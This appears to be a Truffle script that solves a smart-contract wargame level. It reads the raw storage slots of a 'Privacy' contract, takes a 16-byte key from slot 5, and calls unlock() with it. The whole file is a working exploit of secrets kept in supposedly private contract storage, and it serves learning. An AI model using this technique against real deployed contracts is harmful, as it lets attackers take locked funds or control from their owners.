const Privacy = artifacts.require("Privacy");

module.exports = async (callback) => {
  const web3 = Privacy.web3;
  try {
    const privacyAddress = "0x196Cb689Df00dfC1Add3926D658270507707C9b5";
    const privacy = await Privacy.at(privacyAddress);
    let isLocked = await privacy.locked.call();
    console.log("Is locked:", isLocked);
    const s0_locked = await web3.eth.getStorageAt(privacyAddress, 0); // true (bool)
    const s1_ID = await web3.eth.getStorageAt(privacyAddress, 1); // timestamp (uint256)
    const s2_flattening_denomination_awkwardness = await web3.eth.getStorageAt(
      privacyAddress,
      2
    ); // 10 (uint8)
    const s3 = await web3.eth.getStorageAt(privacyAddress, 3); // data[0]
    const s4 = await web3.eth.getStorageAt(privacyAddress, 4); // data[1]
    const s5 = await web3.eth.getStorageAt(privacyAddress, 5); // data[2] ** This is where the password is **

    console.log("S0 Locked", s0_locked);
    console.log("S1 ID", s1_ID);
    console.log(
      "S2 Flattening, Denomination, Awkwardness",
      s2_flattening_denomination_awkwardness
    );
    console.log("S3 ?", s3);
    console.log("S4 ?", s4);
    console.log("S5 ?", s5);

    // slice off first 16 bytes + 0x (34 characters)
    const password = s5.slice(0, 34);
    console.log("Password:", password);
    console.log("Attempting unlock with password...");
    await privacy.unlock(password);

    isLocked = await privacy.locked.call();
    console.log("Is locked:", isLocked);

    console.log("done.");
  } catch (err) {
    console.log("Oops: ", err.message);
  }

  callback();
};
